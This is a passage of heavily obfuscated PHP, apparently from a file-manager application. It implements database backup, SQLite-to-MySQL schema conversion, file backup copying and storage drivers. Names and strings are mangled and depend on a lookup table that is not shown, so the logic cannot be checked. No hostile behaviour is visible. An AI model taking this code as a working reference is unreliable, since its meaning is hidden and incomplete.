$ƒÉñÈÌ³[$‚ãÙ‘¼à[1203]]; continue; } $¬«§àÆ[$ƒÉñÈÌ³[$‚ãÙ‘¼à[1201]]] = array($‚ãÙ‘¼à[1205] => $ƒÉñÈÌ³[$‚ãÙ‘¼à[1201]], $‚ãÙ‘¼à[1204] => array($ƒÉñÈÌ³[$‚ãÙ‘¼à[1203]]), $‚ãÙ‘¼à[1206] => $ƒÉñÈÌ³[$‚ãÙ‘¼à[1207]] == $‚ãÙ‘¼à[91] ? 0 : 1); } $’­ÁĞÇ÷ = array(); foreach ($¬«§àÆ as $ƒÉñÈÌ³) { $äß®©æı = $ƒÉñÈÌ³[$‚ãÙ‘¼à[1205]] == $‚ãÙ‘¼à[1202]; $öÎ«·¼ = $ƒÉñÈÌ³[$‚ãÙ‘¼à[1206]] == $‚ãÙ‘¼à[91] && !$äß®©æı ? $‚ãÙ‘¼à[1208] : $‚ãÙ‘¼à[12]; $‹›ˆ—…é = $‚ãÙ‘¼à[1209] . $û¦´•Óë . $‚ãÙ‘¼à[11] . ($äß®©æı ? $‚ãÙ‘¼à[1210] : $ƒÉñÈÌ³[$‚ãÙ‘¼à[1205]]); $êš‹¬‘ = $‚ãÙ‘¼à[1211] . implode($‚ãÙ‘¼à[1212], $ƒÉñÈÌ³[$‚ãÙ‘¼à[1204]]) . $‚ãÙ‘¼à[1213]; $’­ÁĞÇ÷[] = sprintf($‚ãÙ‘¼à[1214], $‚ãÙ‘¼à[1215], $öÎ«·¼, $‚ãÙ‘¼à[1216], $‹›ˆ—…é, $‚ãÙ‘¼à[1217], $êš‹¬‘); } $„Û¾ŸÉÃ = array(); $¿€şõ°Å = array($‚ãÙ‘¼à[1218] => $‚ãÙ‘¼à[392], $‚ãÙ‘¼à[1219] => $‚ãÙ‘¼à[392], $‚ãÙ‘¼à[366] => $‚ãÙ‘¼à[392], $‚ãÙ‘¼à[365] => $‚ãÙ‘¼à[392], $‚ãÙ‘¼à[1220] => $‚ãÙ‘¼à[1221], $‚ãÙ‘¼à[1222] => $‚ãÙ‘¼à[1221], $‚ãÙ‘¼à[1221] => $‚ãÙ‘¼à[1221], $‚ãÙ‘¼à[1223] => $‚ãÙ‘¼à[1221], $‚ãÙ‘¼à[285] => $‚ãÙ‘¼à[1221], $‚ãÙ‘¼à[1224] => $‚ãÙ‘¼à[1221], $‚ãÙ‘¼à[1225] => $‚ãÙ‘¼à[1221], $‚ãÙ‘¼à[1226] => $‚ãÙ‘¼à[1227], $‚ãÙ‘¼à[367] => $‚ãÙ‘¼à[1227], $‚ãÙ‘¼à[368] => $‚ãÙ‘¼à[1227], $‚ãÙ‘¼à[1228] => $‚ãÙ‘¼à[1228]); foreach ($²òâËÖÃ as $ƒÉñÈÌ³) { $Ñ¬ßÍñ¤ = _get($¿€şõ°Å, $ƒÉñÈÌ³[$‚ãÙ‘¼à[1229]], $ƒÉñÈÌ³[$‚ãÙ‘¼à[1230]]); $»´²Ö—ß = $ƒÉñÈÌ³[$‚ãÙ‘¼à[1231]] == $‚ãÙ‘¼à[997] ? $‚ãÙ‘¼à[1232] : $‚ãÙ‘¼à[1233]; $Şæˆ›£ = $ƒÉñÈÌ³[$‚ãÙ‘¼à[1234]] == $ÛÃºß¯¿ ? $‚ãÙ‘¼à[1235] : $‚ãÙ‘¼à[12]; $€êî»˜÷ = $ƒÉñÈÌ³[$‚ãÙ‘¼à[1048]] ? strtoupper(str_replace($‚ãÙ‘¼à[11], $‚ãÙ‘¼à[12], $ƒÉñÈÌ³[$‚ãÙ‘¼à[1048]])) : $‚ãÙ‘¼à[12]; $„Û¾ŸÉÃ[] = sprintf($‚ãÙ‘¼à[1236], $ƒÉñÈÌ³[$‚ãÙ‘¼à[1234]], $Ñ¬ßÍñ¤, $»´²Ö—ß, $Şæˆ›£, $€êî»˜÷); } $´Ü«“Š = array("\104\122\x4f\x50\40\124\x41\102\x4c\105\40\111\x46\40\105\x58\x49\123\x54\123\x20{$³Î±Ş‹Œ}\73", "\103\x52\x45\x41\x54\105\x20\124\x41\102\x4c\105\x20{$³Î±Ş‹Œ}\40\x28", implode($‚ãÙ‘¼à[50] . PHP_EOL, $„Û¾ŸÉÃ), $‚ãÙ‘¼à[1237]); $¬­ñëÇ— = implode(PHP_EOL, array_merge($´Ü«“Š, $’­ÁĞÇ÷)); if ($Ñ¬ßÍñ¤ == $‚ãÙ‘¼à[13]) { return $¬­ñëÇ—; } $ûÀß¼½É[$‚ãÙ‘¼à[13]] = $¬­ñëÇ—; return $ûÀß¼½É; } public function sqlFromSqlite($ğƒ˜Êèá, $‹±¤™« = '') { $–Ù™ôˆË =& $_SERVER[Î·Ü›öğ]; $Ş¢ÑûşÈ = array($–Ù™ôˆË[900] => $–Ù™ôˆË[12], $–Ù™ôˆË[13] => $–Ù™ôˆË[12]); $„’˜ÄÎü = $this->escapeName($ğƒ˜Êèá); $¿´ÆÙç = $this->escapeName($ğƒ˜Êèá, $–Ù™ôˆË[13]); $¹­áû = $this->model()->db(); $“ˆÛÚ”÷ = "\x50\x52\101\x47\115\101\x20\x54\x41\102\x4c\x45\x5f\x49\116\106\x4f\40\50\x27{$ğƒ˜Êèá}\x27\51"; $è•’ÂÏ = "\x53\105\x4c\x45\103\x54\40\52\40\106\122\x4f\x4d\x20\x73\161\154\151\164\x65\x5f\x6d\141\x73\164\x65\x72\40\x57\110\105\x52\105\x20\x74\142\x6c\x5f\x6e\x61\x6d\145\x20\x3d\40\x27{$ğƒ˜Êèá}\x27"; $Îø©˜€÷ = $¹­áû->query($“ˆÛÚ”÷); if (empty($Îø©˜€÷)) { return $‹±¤™« ? $Ş¢ÑûşÈ[$‹±¤™«] : $Ş¢ÑûşÈ; } $µ³úå†¼ = $¹­áû->query($è•’ÂÏ); $€ÒÈ©‘ª = $´ïÆß”ü = array(); foreach ($µ³úå†¼ as $Ó÷ˆŞÅÙ) { if ($Ó÷ˆŞÅÙ[$–Ù™ôˆË[33]] == $–Ù™ôˆË[359]) { $€ÒÈ©‘ª[] = $Ó÷ˆŞÅÙ[$–Ù™ôˆË[1238]]; } else { $´ïÆß”ü[$Ó÷ˆŞÅÙ[$–Ù™ôˆË[32]]] = $Ó÷ˆŞÅÙ[$–Ù™ôˆË[1238]]; } } $éìê½Ú = array_merge(array("\104\122\x4f\x50\x20\x54\x41\x42\x4c\x45\40\x49\x46\40\105\130\x49\x53\124\123\40{$¿´ÆÙç}\73"), $€ÒÈ©‘ª, array_values($´ïÆß”ü)); $éìê½Ú = implode($–Ù™ôˆË[74] . PHP_EOL, $éìê½Ú) . $–Ù™ôˆË[74]; if ($‹±¤™« == $–Ù™ôˆË[13]) { return $éìê½Ú; } $Ş¢ÑûşÈ[$–Ù™ôˆË[13]] = $éìê½Ú; $¤¶±†õÑ = array(); $¼âõŸ…‰ = array(); foreach ($´ïÆß”ü as $Ãğ‰…’µ => $öÅ½¿Ó) { $³ó”ÈØŒ = str_replace($–Ù™ôˆË[1209] . $ğƒ˜Êèá . $–Ù™ôˆË[11], $–Ù™ôˆË[12], $Ãğ‰…’µ); $³ó”ÈØŒ = str_replace($ğƒ˜Êèá . $–Ù™ôˆË[11], $–Ù™ôˆË[12], $³ó”ÈØŒ); $ìÕ±ıÊ» = str_replace(array($–Ù™ôˆË[121], $–Ù™ôˆË[1056]), $–Ù™ôˆË[463], substr($öÅ½¿Ó, stripos($öÅ½¿Ó, $–Ù™ôˆË[340]))); $¤¶±†õÑ[$³ó”ÈØŒ] = $ìÕ±ıÊ»; $¼âõŸ…‰[$³ó”ÈØŒ] = $öÅ½¿Ó; } $‚âõ®å× = array(); $²ä‘Ó¼ò = array(); $ò´ÚŒèë = array($–Ù™ôˆË[1219] => $–Ù™ôˆË[1239], $–Ù™ôˆË[392] => $–Ù™ôˆË[1240], $–Ù™ôˆË[1227] => $–Ù™ôˆË[1241], $–Ù™ôˆË[1221] => $–Ù™ôˆË[1223], $–Ù™ôˆË[1228] => $–Ù™ôˆË[1242]); $÷¶úö Ã = $ˆŞ´­‰ğ = $–Ù™ôˆË[12]; foreach ($Îø©˜€÷ as $Ó÷ˆŞÅÙ) { $ğ¶ÂØ… = $Ó÷ˆŞÅÙ[$–Ù™ôˆË[33]]; if ($ğ¶ÂØ… == $–Ù™ôˆË[1221] && isset($¤¶±†õÑ[$Ó÷ˆŞÅÙ[$–Ù™ôˆË[32]]])) { $ğ¶ÂØ… = $–Ù™ôˆË[1243]; } $²ä‘Ó¼ò[$Ó÷ˆŞÅÙ[$–Ù™ôˆË[32]]] = $ğ¶ÂØ…; $‹±¤™« = _get($ò´ÚŒèë, $ğ¶ÂØ…, $ğ¶ÂØ…); $”ãèáé = $–Ù™ôˆË[12]; if ($Ó÷ˆŞÅÙ[$–Ù™ôˆË[57]] == $–Ù™ôˆË[91]) { if (stripos($ğ¶ÂØ…, $–Ù™ôˆË[366]) !== !1) { $”ãèáé = $–Ù™ôˆË[1244]; } $÷¶úö Ã = $Ó÷ˆŞÅÙ[$–Ù™ôˆË[32]]; } $§ŸÃ‚Ïş = $Ó÷ˆŞÅÙ[$–Ù™ôˆË[56]] === null ? $–Ù™ôˆË[1245] : (is_string($Ó÷ˆŞÅÙ[$–Ù™ôˆË[56]]) ? "\47{$Ó÷ˆŞÅÙ[$–Ù™ôˆË[56]]}\47" : $Ó÷ˆŞÅÙ[$–Ù™ôˆË[56]]); $ªÀâæ¸ü = $Ó÷ˆŞÅÙ[$–Ù™ôˆË[35]] == $–Ù™ôˆË[91] ? $–Ù™ôˆË[1232] : $–Ù™ôˆË[1246] . $§ŸÃ‚Ïş; $‚âõ®å×[] = sprintf($–Ù™ôˆË[1247], $Ó÷ˆŞÅÙ[$–Ù™ôˆË[32]], $‹±¤™«, $ªÀâæ¸ü, $”ãèáé); } foreach ($¤¶±†õÑ as $³ó”ÈØŒ => $ìÕ±ıÊ») { if (stripos($¼âõŸ…‰[$³ó”ÈØŒ], $–Ù™ôˆË[1202]) !== !1) { $ò¤Ô Äª = $ˆŞ´­‰ğ = $–Ù™ôˆË[1248] . $÷¶úö Ã . $–Ù™ôˆË[1249]; } else { $€¡œ“Ğ‚ = stripos($¼âõŸ…‰[$³ó”ÈØŒ], $–Ù™ôˆË[1208]) !== !1; $¯‚©êŸ× = !1; $•·Ğ¹Õæ = array(); $½ÔÈï÷ç = explode($–Ù™ôˆË[50], rtrim(ltrim($ìÕ±ıÊ», $–Ù™ôˆË[340]), $–Ù™ôˆË[1004])); foreach ($½ÔÈï÷ç as $Ãğ‰…’µ) { $Ãğ‰…’µ = trim($Ãğ‰…’µ, $–Ù™ôˆË[999]); if (isset($²ä‘Ó¼ò[$Ãğ‰…’µ]) && $²ä‘Ó¼ò[$Ãğ‰…’µ] == $–Ù™ôˆË[1243]) { $¯‚©êŸ× = !0; $•·Ğ¹Õæ[] = "\x60{$Ãğ‰…’µ}\x60\x28\x32\x35\x30\x29"; } else { $•·Ğ¹Õæ[] = "\140{$Ãğ‰…’µ}\140"; } } if ($¯‚©êŸ×) { $ìÕ±ıÊ» = $–Ù™ôˆË[340] . implode($–Ù™ôˆË[50], $•·Ğ¹Õæ) . $–Ù™ôˆË[1004]; } $ò¤Ô Äª = ($€¡œ“Ğ‚ ? $–Ù™ôˆË[1250] : $–Ù™ôˆË[12]) . "\x4b\105\131\40\140{$³ó”ÈØŒ}\140\x20{$ìÕ±ıÊ»}"; } $‚âõ®å×[] = $ò¤Ô Äª; } if ($÷¶úö Ã && !$ˆŞ´­‰ğ) { $‚âõ®å× = array_merge(array($–Ù™ôˆË[1248] . $÷¶úö Ã . $–Ù™ôˆË[1249]), $‚âõ®å×); } $êÔÆÌÊ¦ = array("\104\x52\117\120\x20\124\101\102\x4c\105\40\x49\x46\x20\105\130\x49\x53\x54\x53\40{$„’˜ÄÎü}\x3b", "\103\x52\105\101\x54\x45\x20\124\x41\102\x4c\105\x20{$„’˜ÄÎü}\x20\x28", implode($–Ù™ôˆË[50] . PHP_EOL, $‚âõ®å×), $–Ù™ôˆË[1251]); $óÈ¬ÁÙ = implode(PHP_EOL, $êÔÆÌÊ¦); if ($‹±¤™« == $–Ù™ôˆË[900]) { return $óÈ¬ÁÙ; } $Ş¢ÑûşÈ[$–Ù™ôˆË[900]] = $óÈ¬ÁÙ; return $Ş¢ÑûşÈ; } private function escapeName($‰Ğ¾¡Û˜, $¢Èåüç = "\155\x79\163\161\x6c") { $¼Ã „™å =& $_SERVER[Î·Ü›öğ]; $‰Ğ¾¡Û˜ = preg_replace($¼Ã „™å[1252], $¼Ã „™å[12], $‰Ğ¾¡Û˜); if ($¢Èåüç === $¼Ã „™å[900]) { return "\x60{$‰Ğ¾¡Û˜}\x60"; } return "\42{$‰Ğ¾¡Û˜}\x22"; } } goto C‰˜æ‰öŒ†; d‹ÙÇîµ„: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $èÊ¼µÃ =& $_SERVER[Î·Ü›öğ]; $É’ãªÇ‘ = Backup::get(); self::$io = $É’ãªÇ‘[$èÊ¼µÃ[841]]; self::$name = $É’ãªÇ‘[$èÊ¼µÃ[32]]; $Ü¾Ê©ÈÕ = new DbManage(); $ñ€áÔ¨¹ = $Ü¾Ê©ÈÕ->dbType(); $ÃÁ™ÙÆï = array($èÊ¼µÃ[870] => $ñ€áÔ¨¹, $èÊ¼µÃ[871] => time()); Backup::set($ÃÁ™ÙÆï); $ÜŒº—â = $this->tmpFilesPath() . $èÊ¼µÃ[872] . self::$name . $èÊ¼µÃ[8]; del_dir($ÜŒº—â); mk_dir($ÜŒº—â); $ˆŠß„Âş = $¾Ê•Œî™ = 0; try { $ñµ±‡Ú = $Ü¾Ê©ÈÕ->db()->getTables(); } catch (Exception $´Òİøê) { Backup::log($èÊ¼µÃ[873] . $´Òİøê->getMessage()); return !1; } $ñµ±‡Ú = array_diff($ñµ±‡Ú, array($èÊ¼µÃ[874], $èÊ¼µÃ[875])); foreach ($ñµ±‡Ú as $Ç’â”šŒ) { if ($Ç’â”šŒ == $èÊ¼µÃ[876]) { continue; } $ˆŠß„Âş += $Ü¾Ê©ÈÕ->model($Ç’â”šŒ)->count(); } $ Ô¡¼® = new Task($èÊ¼µÃ[877], $èÊ¼µÃ[869], $ˆŠß„Âş, LNG($èÊ¼µÃ[878]) . $èÊ¼µÃ[879] . LNG($èÊ¼µÃ[880])); $GLOBALS[$èÊ¼µÃ[881]] = self::$name; foreach ($ñµ±‡Ú as $Ç’â”šŒ) { $„’‚·— = $ÜŒº—â . $Ç’â”šŒ . $èÊ¼µÃ[882]; if ($Ç’â”šŒ == $èÊ¼µÃ[876]) { @touch($„’‚·—); continue; } $¹—ä”î¬ = null; if ($Ç’â”šŒ == $èÊ¼µÃ[883] && $É’ãªÇ‘[$èÊ¼µÃ[171]] == $èÊ¼µÃ[868]) { $¹—ä”î¬ = self::$io; } $¾Ê•Œî™ += $Ü¾Ê©ÈÕ->sqlFromDb($Ç’â”šŒ, $„’‚·—, $ Ô¡¼®, $¹—ä”î¬); } unset($GLOBALS[$èÊ¼µÃ[881]]); $ Ô¡¼®->end(); if ($¾Ê•Œî™ > $ˆŠß„Âş) { $ˆŠß„Âş = $¾Ê•Œî™; } $ÃÁ™ÙÆï = array($èÊ¼µÃ[870] => $ñ€áÔ¨¹, $èÊ¼µÃ[865] => 1, $èÊ¼µÃ[884] => $ˆŠß„Âş, $èÊ¼µÃ[885] => $¾Ê•Œî™, $èÊ¼µÃ[886] => time()); Backup::set($ÃÁ™ÙÆï); if ($ˆŠß„Âş - $¾Ê•Œî™ > 0) { $üì×¸ÁÂ = $èÊ¼µÃ[887]; if (!stristr(I18n::getType(), $èÊ¼µÃ[888])) { $üì×¸ÁÂ = $èÊ¼µÃ[889]; } Backup::log(array($üì×¸ÁÂ, $ÃÁ™ÙÆï)); return !1; } return !0; } private function tmpFilesPath() { $„™¬¿Ü· =& $_SERVER[Î·Ü›öğ]; $ßÈé¼²Ø = TEMP_FILES; if ($GLOBALS[$„™¬¿Ü·[6]][$„™¬¿Ü·[92]][$„™¬¿Ü·[890]]) { $ßÈé¼²Ø = $GLOBALS[$„™¬¿Ü·[6]][$„™¬¿Ü·[92]][$„™¬¿Ü·[890]]; if (!mk_dir($ßÈé¼²Ø) || !is_writable($ßÈé¼²Ø) || !IO::mkfile($ßÈé¼²Ø . $„™¬¿Ü·[891])) { $ßÈé¼²Ø = TEMP_FILES; } } return $ßÈé¼²Ø; } } class BackupDbFile { public function __construct() { } public function index() { $˜ªæìÜ¨ =& $_SERVER[Î·Ü›öğ]; $ä°Õ®³û = Backup::get(); $‡ãâ‘Èö = $ä°Õ®³û[$˜ªæìÜ¨[32]]; $¾ı£÷ñ = $this->tmpFilesPath() . "\x62\x61\x63\x6b\165\x70\137{$‡ãâ‘Èö}\x2f"; $öïÄŒáù = $this->backupPath($ä°Õ®³û); if (!($öïÄŒáù = IO::mkdir($öïÄŒáù))) { Backup::log($˜ªæìÜ¨[892] . $öïÄŒáù); return !1; } $ÊÂ¸Åà = IO::listPath($¾ı£÷ñ); $¢¸í»ÛÎ = isset($ÊÂ¸Åà[$˜ªæìÜ¨[86]]) ? $ÊÂ¸Åà[$˜ªæìÜ¨[86]] : array(); $²ãÖçÊ® = array_sum(array_column($¢¸í»ÛÎ, $˜ªæìÜ¨[79])); if (!$²ãÖçÊ®) { Backup::log($˜ªæìÜ¨[893] . $¾ı£÷ñ); return !1; } $şÌí»”° = array($˜ªæìÜ¨[894] => $²ãÖçÊ®, $˜ªæìÜ¨[895] => time()); Backup::set($şÌí»”°); $éáÙˆª = new TaskFileTransfer($˜ªæìÜ¨[896], $˜ªæìÜ¨[869], count($¢¸í»ÛÎ), LNG($˜ªæìÜ¨[878]) . $˜ªæìÜ¨[464] . LNG($˜ªæìÜ¨[880]) . $˜ªæìÜ¨[897]); $éáÙˆª->task[$˜ªæìÜ¨[853]] = $²ãÖçÊ®; foreach ($ÊÂ¸Åà[$˜ªæìÜ¨[86]] as $ ‘äÄ®û) { $•¡Øø›ö = IO::move($ ‘äÄ®û[$˜ªæìÜ¨[87]], $öïÄŒáù); if (!$•¡Øø›ö) { $éáÙˆª->end(); $ğİ»“È× = IO::getLastError($˜ªæìÜ¨[898] . $ ‘äÄ®û[$˜ªæìÜ¨[87]] . $˜ªæìÜ¨[899] . $öïÄŒáù . $˜ªæìÜ¨[178]); Backup::log($ğİ»“È×); return !1; } } $Ì”óäÜä = new DbManage(); $ÁÖäÏ¾Ÿ = $Ì”óäÜä->getSqlFile(); if (!$ÁÖäÏ¾Ÿ || !$ÁÖäÏ¾Ÿ[$˜ªæìÜ¨[900]] || !$ÁÖäÏ¾Ÿ[$˜ªæìÜ¨[13]]) { Backup::log($˜ªæìÜ¨[901]); return !1; } IO::move($ÁÖäÏ¾Ÿ[$˜ªæìÜ¨[900]], $öïÄŒáù); IO::move($ÁÖäÏ¾Ÿ[$˜ªæìÜ¨[13]], $öïÄŒáù); $éáÙˆª->end(); $şÌí»”° = array($˜ªæìÜ¨[902] => $²ãÖçÊ®, $˜ªæìÜ¨[903] => time()); Backup::set($şÌí»”°); return !0; } private function backupPath($ÖÁŞåƒˆ) { $Áîá¢· =& $_SERVER[Î·Ü›öğ]; $ß‹®£‹Á = $ÖÁŞåƒˆ[$Áîá¢·[32]]; $Ù‚ƒ€íì = Model($Áîá¢·[862])->get($Áîá¢·[863]); $Ø¤ä¾ğÈ = substr(md5($Áîá¢·[864] . $Ù‚ƒ€íì . $ß‹®£‹Á), 0, 8); return "\x7b\151\157\72{$ÖÁŞåƒˆ[$Áîá¢·[841]]}\175\x2f\144\141\x74\141\x62\141\x73\x65\x2f\142\x61\x63\x6b\165\160\x2f" . $ß‹®£‹Á . $Áîá¢·[11] . $Ø¤ä¾ğÈ; } private function tmpFilesPath() { $¿ÕîÃ²¾ =& $_SERVER[Î·Ü›öğ]; $›ÑûÀıª = TEMP_FILES; if ($GLOBALS[$¿ÕîÃ²¾[6]][$¿ÕîÃ²¾[92]][$¿ÕîÃ²¾[890]]) { $›ÑûÀıª = $GLOBALS[$¿ÕîÃ²¾[6]][$¿ÕîÃ²¾[92]][$¿ÕîÃ²¾[890]]; if (!mk_dir($›ÑûÀıª) || !is_writable($›ÑûÀıª) || !IO::mkfile($›ÑûÀıª . $¿ÕîÃ²¾[891])) { $›ÑûÀıª = TEMP_FILES; } } return $›ÑûÀıª; } } class BackupFile { public function __construct() { } public function index() { $†¥Íúé– = Backup::get(); $ÁµÎàÀ = $†¥Íúé–[$_SERVER[Î·Ü›öğ][845]][$_SERVER[Î·Ü›öğ][233]][$_SERVER[Î·Ü›öğ][554]]; $•úÌáÆü = array($_SERVER[Î·Ü›öğ][555] => array($_SERVER[Î·Ü›öğ][904], $ÁµÎàÀ), $_SERVER[Î·Ü›öğ][905] => array($_SERVER[Î·Ü›öğ][408], $†¥Íúé–[$_SERVER[Î·Ü›öğ][841]])); $Ãüêøâì = (int) Model($_SERVER[Î·Ü›öğ][883])->where($•úÌáÆü)->count($_SERVER[Î·Ü›öğ][554]); $Ü˜ÍµÈş = (int) Model($_SERVER[Î·Ü›öğ][883])->where($•úÌáÆü)->sum($_SERVER[Î·Ü›öğ][79]); $›Ë’¦‘ù = new TaskFileTransfer($_SERVER[Î·Ü›öğ][906], $_SERVER[Î·Ü›öğ][869], $Ãüêøâì, LNG($_SERVER[Î·Ü›öğ][878]) . $_SERVER[Î·Ü›öğ][879] . LNG($_SERVER[Î·Ü›öğ][907])); $›Ë’¦‘ù->task[$_SERVER[Î·Ü›öğ][853]] = $Ü˜ÍµÈş; $úßµ¥Å = array($_SERVER[Î·Ü›öğ][908] => $Ãüêøâì, $_SERVER[Î·Ü›öğ][909] => $Ü˜ÍµÈş, $_SERVER[Î·Ü›öğ][910] => time()); Backup::set($úßµ¥Å); $’â±ùæ  = !0; $İ¸×Ûˆ  = $this->storeIds(); $İç„Â¨¨ = 1; $ï“ª«í÷ = 1000; $É²¼öœ  = $½Ñê¬Ùä = 0; $ş¨É×œ† = array(); $Ëî¬Êµ = $¡œ´ã‹‹ = 0; do { $™šºŒúÀ = $_SERVER[Î·Ü›öğ][911]; $úÃ˜‰”Õ = Model($_SERVER[Î·Ü›öğ][883])->where($•úÌáÆü)->field($™šºŒúÀ)->order($_SERVER[Î·Ü›öğ][912])->selectPage($ï“ª«í÷, $İç„Â¨¨); $¾©—™·¿ = !empty($úÃ˜‰”Õ[$_SERVER[Î·Ü›öğ][447]]) ? $úÃ˜‰”Õ[$_SERVER[Î·Ü›öğ][447]] : array(); foreach ($¾©—™·¿ as $ûß‡”ğÊ) { if (!$this->_fileExist($ûß‡”ğÊ, $ş¨É×œ†, $İ¸×Ûˆ )) { Backup::log($_SERVER[Î·Ü›öğ][913] . $ûß‡”ğÊ[$_SERVER[Î·Ü›öğ][554]] . $_SERVER[Î·Ü›öğ][914] . $ûß‡”ğÊ[$_SERVER[Î·Ü›öğ][87]]); continue; } $ÃÈ•›Ò = $ûß‡”ğÊ[$_SERVER[Î·Ü›öğ][87]]; $¶ñ´®Ç = "\173\x69\157\72{$†¥Íúé–[$_SERVER[Î·Ü›öğ][841]]}\175" . substr($ÃÈ•›Ò, strlen("\173\x69\157\72{$ûß‡”ğÊ[$_SERVER[Î·Ü›öğ][915]]}\175")); if (IO::exist($¶ñ´®Ç)) { $›Ë’¦‘ù->updateFileEnd($ûß‡”ğÊ[$_SERVER[Î·Ü›öğ][32]], $ûß‡”ğÊ[$_SERVER[Î·Ü›öğ][79]]); } else { $¶ñ´®Ç = get_path_father($¶ñ´®Ç); IO::mkdir($¶ñ´®Ç); if (!IO::copy($ÃÈ•›Ò, $¶ñ´®Ç, $_SERVER[Î·Ü›öğ][916])) { Backup::log($_SERVER[Î·Ü›öğ][917] . $ÃÈ•›Ò . $_SERVER[Î·Ü›öğ][899] . $¶ñ´®Ç . $_SERVER[Î·Ü›öğ][178]); $’â±ùæ  = !1; break; } } $ÁµÎàÀ = $ûß‡”ğÊ[$_SERVER[Î·Ü›öğ][554]]; $½Ñê¬Ùä += 1; $É²¼öœ  += $ûß‡”ğÊ[$_SERVER[Î·Ü›öğ][79]]; $¡œ´ã‹‹ += 1; $Ëî¬Êµ += $ûß‡”ğÊ[$_SERVER[Î·Ü›öğ][79]]; if ($É²¼öœ  >= 1024 * 1024 * 100) { $úßµ¥Å = array($_SERVER[Î·Ü›öğ][840] => $ÁµÎàÀ, $_SERVER[Î·Ü›öğ][918] => $¡œ´ã‹‹, $_SERVER[Î·Ü›öğ][919] => $Ëî¬Êµ); Backup::set($úßµ¥Å); $É²¼öœ  = $½Ñê¬Ùä = 0; } } $ä÷†Î†İ = count($¾©—™·¿); $İç„Â¨¨++; } while ($ä÷†Î†İ == $ï“ª«í÷); $›Ë’¦‘ù->end(); $úßµ¥Å = array($_SERVER[Î·Ü›öğ][920] => 1, $_SERVER[Î·Ü›öğ][851] => time(), $_SERVER[Î·Ü›öğ][867] => 1, $_SERVER[Î·Ü›öğ][840] => $ÁµÎàÀ, $_SERVER[Î·Ü›öğ][921] => time()); if ($½Ñê¬Ùä) { $úßµ¥Å[$_SERVER[Î·Ü›öğ][918]] = $¡œ´ã‹‹; $úßµ¥Å[$_SERVER[Î·Ü›öğ][919]] = $Ëî¬Êµ; } Backup::set($úßµ¥Å); return !0; } private function _fileExist($Œù×éÙË, &$ùªˆÓ•è, $¬é¼““×) { $šµÂµµ½ =& $_SERVER[Î·Ü›öğ]; $ö¦Ùå’× = $Œù×éÙË[$šµÂµµ½[87]]; if (in_array($Œù×éÙË[$šµÂµµ½[554]], $ùªˆÓ•è)) { return !1; } if (!in_array($Œù×éÙË[$šµÂµµ½[915]], $¬é¼““×)) { return !1; } if (IO::exist($ö¦Ùå’×)) { return !0; } $Êƒ”²‡Œ = get_path_father($ö¦Ùå’×); if (IO::exist($Êƒ”²‡Œ)) { $ùªˆÓ•è[] = $Œù×éÙË[$šµÂµµ½[554]]; return !1; } $Š¯·ÎÊÉ = array($šµÂµµ½[915] => $Œù×éÙË[$šµÂµµ½[915]], $šµÂµµ½[87] => array($šµÂµµ½[461], "{$Êƒ”²‡Œ}\x25")); $öüßÁú = Model($šµÂµµ½[883])->where($Š¯·ÎÊÉ)->field($šµÂµµ½[555])->select(); $ùªˆÓ•è = array_merge($ùªˆÓ•è, array_to_keyvalue($öüßÁú, $šµÂµµ½[12], $šµÂµµ½[554])); return !1; } private function _fileFilter($èÎ¾Ú…ş) { $ô½ôÃÍ× =& $_SERVER[Î·Ü›öğ]; return; if (empty($èÎ¾Ú…ş)) { return; } $¨Ÿ•™•¹ = array($ô½ôÃÍ×[554] => array($ô½ôÃÍ×[7], array_unique($èÎ¾Ú…ş))); $•Û›°èÇ = Model($ô½ôÃÍ×[922])->where($¨Ÿ•™•¹)->field($ô½ôÃÍ×[194])->select(); foreach ($•Û›°èÇ as $ÏºŠ‰Ğ¡) { Model($ô½ôÃÍ×[922])->remove($ÏºŠ‰Ğ¡[$ô½ôÃÍ×[194]], !1); } } private function storeIds() { $¥·È¬ÖÍ =& $_SERVER[Î·Ü›öğ]; $â¥îÏœÓ = Model($¥·È¬ÖÍ[857])->listData(); $Å£Ü»í• = array(); $¶Ú€İ– = $GLOBALS[$¥·È¬ÖÍ[6]][$¥·È¬ÖÍ[92]][$¥·È¬ÖÍ[923]]; foreach ($â¥îÏœÓ as $²àÖãÔÃ) { $ã…•‘Ëö = strtolower($²àÖãÔÃ[$¥·È¬ÖÍ[98]]); if (!isset($¶Ú€İ–[$ã…•‘Ëö])) { continue; } $ŠµŠàçÆ = $¥·È¬ÖÍ[77] . (isset($¶Ú€İ–[$ã…•‘Ëö]) ? $¶Ú€İ–[$ã…•‘Ëö] : ucfirst($ã…•‘Ëö)); if (!class_exists($ŠµŠàçÆ)) { continue; } $Å£Ü»í•[] = $²àÖãÔÃ[$¥·È¬ÖÍ[477]]; } return $Å£Ü»í•; } } goto bˆ¯ŸôĞÔ; cÇéŞÇïÚä: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($ÅÈãç°) { parent::__construct($ÅÈãç°); $this->setSignVersion($_SERVER[Î·Ü›öğ][250]); } public function uploadLink($Îğ¹ä, $ú’‡“¬ = 0) { $Æéèïè› =& $_SERVER[Î·Ü›öğ]; if ($this->isUploadServer()) { return; } $¡ªÚá¨ú = $this->getType(); if (!in_array($¡ªÚá¨ú, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ˆ•¬²ÚŠ = (!$ú’‡“¬ ? 1 : ceil($ú’‡“¬ / pow(1024, 3))) * 3600 * 4; $à’£’œ² = $this->uploadMultiData($Îğ¹ä, $ˆ•¬²ÚŠ); if ($à’£’œ²) { $à’£’œ²[$Æéèïè›[97]] = $Îğ¹ä; $à’£’œ²[$Æéèïè›[98]] = $¡ªÚá¨ú; } return $à’£’œ²; } public function fileOutImage($üˆôÙëñ, $ßÅä³„Ğ = 250) { if ($this->size($üˆôÙëñ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($üˆôÙëñ, $ßÅä³„Ğ); } $Êòè‚ = $this->link($üˆôÙëñ); $Êòè‚ .= $_SERVER[Î·Ü›öğ][1491] . $ßÅä³„Ğ; $this->fileOutLink($Êòè‚); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ÜŸ°şº) { if (substr($ÜŸ°şº, 0, 2) == $_SERVER[Î·Ü›öğ][1448]) { $ÜŸ°şº = BASIC_PATH . substr($ÜŸ°şº, 2); } return $ÜŸ°şº; } public function iconvApp($ÑâÛ“˜¤) { $ÃƒúÀ» =& $_SERVER[Î·Ü›öğ]; global $config; return 